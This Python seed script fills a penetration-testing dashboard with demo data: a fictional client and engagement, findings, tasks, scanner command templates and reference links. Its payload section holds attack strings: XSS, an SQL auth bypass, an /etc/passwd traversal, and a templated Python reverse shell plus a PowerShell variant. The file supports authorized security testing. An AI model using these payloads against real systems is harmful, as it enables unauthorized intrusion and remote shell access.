"""Database seed script – creates demo data.

Usage:
    python scripts/seed.py
"""
from __future__ import annotations

import asyncio
import sys
from pathlib import Path

# Allow running from repo root
sys.path.insert(0, str(Path(__file__).parent.parent))

from backend.app.config import settings
from backend.app.database import init_db, async_session_factory
from backend.app.models.client import Client, ClientContact
from backend.app.models.engagement import Engagement
from backend.app.models.scope import ScopeItem
from backend.app.models.target import Target
from backend.app.models.finding import Finding, FindingTemplate
from backend.app.models.evidence import Evidence
from backend.app.models.task import Task, TaskChecklistItem
from backend.app.models.link import Link, LinkCollection
from backend.app.models.command import Command
from backend.app.models.payload import Payload
from backend.app.models.note import Note
from backend.app.models.setting import ApplicationSetting
from backend.app.models.base import utcnow


async def seed() -> None:
    await init_db()

    async with async_session_factory() as session:
        # Client
        client = Client(
            name="[DEMO] Acme Corporation",
            legal_name="Acme Corp Ltd.",
            industry="Technology",
            notes="Demo client – for testing purposes only",
        )
        session.add(client)
        await session.flush()

        contact = ClientContact(
            client_id=client.id,
            name="Jane Smith",
            title="CISO",
            email="jane.smith@example.invalid",
            phone="+1-555-0100",
            is_primary=True,
        )
        session.add(contact)

        # Engagement
        from datetime import date
        eng = Engagement(
            name="[DEMO] Acme Web Application Pentest",
            identifier="ENG-2024-001",
            client_id=client.id,
            description="Demonstration engagement for the PentestDashboard seed data.",
            engagement_type="web_application",
            status="active",
            start_date=date(2024, 1, 15),
            end_date=date(2024, 1, 26),
            primary_tester="demo_user",
            rules_of_engagement="Testing hours: 08:00–18:00 EST. No DoS testing.",
            authorization_notes="Written authorization on file.",
        )
        session.add(eng)
        await session.flush()

        # Scope
        for item_type, value in [
            ("domain", "app.acme.invalid"),
            ("url", "https://api.acme.invalid"),
            ("ip_address", "10.10.10.0/24"),
        ]:
            session.add(ScopeItem(engagement_id=eng.id, item_type=item_type, value=value, in_scope=True))

        # Targets
        targets = []
        for hostname, ip, port, tech in [
            ("app.acme.invalid", "10.10.10.10", 443, "nginx/Apache"),
            ("api.acme.invalid", "10.10.10.11", 443, "Node.js"),
            ("admin.acme.invalid", "10.10.10.12", 8443, "Tomcat"),
        ]:
            t = Target(
                engagement_id=eng.id,
                hostname=hostname,
                ip_address=ip,
                port=port,
                protocol="tcp",
                url=f"https://{hostname}",
                technology=tech,
                environment="production",
                in_scope=True,
                source="manual",
                first_seen=utcnow(),
            )
            session.add(t)
            targets.append(t)
        await session.flush()

        # Findings
        finding_data = [
            ("SQL Injection in Login Form", "critical", "confirmed",
             "The login form is vulnerable to SQL injection via the `username` parameter.",
             "Parameterize all database queries using prepared statements."),
            ("Stored XSS in Comment Field", "high", "confirmed",
             "User-supplied input in the comments field is rendered without sanitization.",
             "Encode all user-supplied output. Implement a Content Security Policy."),
            ("Missing CSRF Protection on Password Change", "medium", "draft",
             "The password change form does not include anti-CSRF tokens.",
             "Implement synchronizer token pattern or SameSite cookies."),
            ("Server Version Disclosure", "low", "draft",
             "The HTTP response headers reveal the server software version.",
             "Configure the server to suppress version information in response headers."),
            ("TLS 1.0 Supported", "informational", "draft",
             "The server accepts TLS 1.0 connections which are considered deprecated.",
             "Disable TLS 1.0 and 1.1. Require TLS 1.2 or later."),
        ]
        for title, severity, status, desc, remediation in finding_data:
            session.add(Finding(
                engagement_id=eng.id,
                title=f"[DEMO] {title}",
                severity=severity,
                status=status,
                description=desc,
                remediation=remediation,
                in_report=True,
            ))

        # Tasks
        task_data = [
            ("Recon and target enumeration", "complete"),
            ("Web application scanning", "in_progress"),
            ("Manual testing – authentication", "in_progress"),
            ("Review scan results", "backlog"),
            ("Draft findings report", "backlog"),
        ]
        for title, status in task_data:
            session.add(Task(engagement_id=eng.id, title=f"[DEMO] {title}", status=status, priority="normal"))

        # Finding Templates
        templates = [
            ("SQL Injection", "injection", "high", "CWE-89"),
            ("Cross-Site Scripting (XSS)", "input_validation", "medium", "CWE-79"),
            ("Insecure Direct Object Reference (IDOR)", "authorization", "medium", "CWE-639"),
            ("Sensitive Data Exposure", "cryptography", "high", "CWE-311"),
            ("Security Misconfiguration", "configuration", "medium", "CWE-16"),
        ]
        for title, category, severity, cwe in templates:
            session.add(FindingTemplate(title=title, category=category, severity=severity, cwe=cwe))

        # Links
        collection = LinkCollection(name="Vulnerability Research", description="Reference links for research")
        session.add(collection)
        await session.flush()

        link_data = [
            ("OWASP Top Ten", "https://owasp.org/www-project-top-ten/", "vulnerability_research"),
            ("NVD / CVE Search", "https://nvd.nist.gov/vuln/search", "vulnerability_research"),
            ("CWE List", "https://cwe.mitre.org/data/index.html", "vulnerability_research"),
            ("MITRE ATT&CK", "https://attack.mitre.org/", "vulnerability_research"),
            ("PortSwigger Web Security Academy", "https://portswigger.net/web-security", "vulnerability_research"),
            ("HackTricks", "https://book.hacktricks.xyz/", "vulnerability_research"),
            ("PayloadsAllTheThings", "https://github.com/swisskyrepo/PayloadsAllTheThings", "vulnerability_research"),
            ("GTFOBins", "https://gtfobins.github.io/", "vulnerability_research"),
            ("LOLBAS", "https://lolbas-project.github.io/", "vulnerability_research"),
            ("Exploit-DB", "https://www.exploit-db.com/", "exploit_references"),
        ]
        for name, url, category in link_data:
            session.add(Link(name=name, url=url, category=category, collection_id=collection.id, engagement_id=eng.id))

        # Commands
        command_data = [
            ("Nmap TCP SYN Scan", "network", "nmap -sS -sV -p- --open -oX {{output}} {{target}}", "nmap"),
            ("Nmap Fast Scan", "network", "nmap -F -sV {{target}}", "nmap"),
            ("ffuf Directory Brute Force", "web", "ffuf -w {{wordlist}} -u {{url}}/FUZZ -mc 200,301,302,403 -o {{output}}", "ffuf"),
            ("SQLMap Basic Scan", "web", "sqlmap -u '{{url}}' --batch --level=3 --risk=2", "sqlmap"),
            ("Gobuster DNS Enum", "network", "gobuster dns -d {{domain}} -w {{wordlist}} -o {{output}}", "gobuster"),
        ]
        for name, category, cmd_text, tool in command_data:
            session.add(Command(name=name, category=category, command_text=cmd_text, tool=tool, operating_system="linux"))

        # Payloads
        payload_data = [
            ("Basic XSS Test", "injection", "<script>alert('XSS')</script>", "html"),
            ("SQL Injection - Authentication Bypass", "injection", "' OR '1'='1", "sql"),
            ("Directory Traversal", "injection", "../../../../etc/passwd", "text"),
            ("Python Reverse Shell", "reverse_shell", "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{ip}}\",{{port}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "python"),
            ("PowerShell Base64 Reverse Shell", "reverse_shell", "powershell -e {{base64_payload}}", "powershell"),
        ]
        for name, category, content, language in payload_data:
            session.add(Payload(
                name=name,
                category=category,
                content=content,
                language=language,
                authorized_use_warning="Use only on systems you are explicitly authorized to test.",
            ))

        # Notes
        session.add(Note(
            engagement_id=eng.id,
            title="[DEMO] Day 1 Testing Log",
            content="## Day 1\n\n- Completed initial reconnaissance\n- Ran Nmap scan on in-scope targets\n- Identified 3 hosts with open web services\n\n## Observations\n\n- Login portal appears to reflect user input without sanitization\n- API endpoints respond with verbose error messages",
            note_type="daily",
        ))

        # Settings
        session.add(ApplicationSetting(key="active_engagement_id", value=eng.id, description="Currently active engagement"))
        session.add(ApplicationSetting(key="app_theme", value="dark", description="UI theme"))

        await session.commit()
        print("✅ Seed data created successfully.")
        print(f"   Client:     {client.name}")
        print(f"   Engagement: {eng.name}")
        print(f"   Findings:   {len(finding_data)}")
        print(f"   Tasks:      {len(task_data)}")
        print(f"   Links:      {len(link_data)}")


if __name__ == "__main__":
    asyncio.run(seed())
